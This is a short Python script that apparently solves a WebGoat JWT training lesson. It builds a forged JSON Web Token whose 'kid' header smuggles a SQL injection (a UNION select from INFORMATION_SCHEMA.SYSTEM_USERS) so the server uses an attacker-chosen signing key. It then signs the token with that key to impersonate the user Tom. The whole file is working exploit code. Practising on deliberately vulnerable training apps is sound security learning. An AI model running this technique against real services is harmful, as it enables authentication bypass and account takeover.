import base64  
import hashlib  
import hmac  
  
def jwt_tokens_8():  
     def hmac_base64(key, message):  
         return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))  
  
     header = '{"typ":"JWT","kid":"hacked\' UNION select \'ZGVsZXRpbmdUb20=\' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}'.encode()  
     payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}'.encode()  
  
     new_token = (base64.urlsafe_b64encode(header).decode().rstrip('=') +  
         '.' +  
         base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()  
     new_signature = hmac_base64('deletingTom'.encode(), new_token)  
     new_token += ('.' + new_signature.decode().rstrip('=')).encode()  
  
     print('New token: {}'.format(new_token.decode()))  
     return  
  
jwt_tokens_8()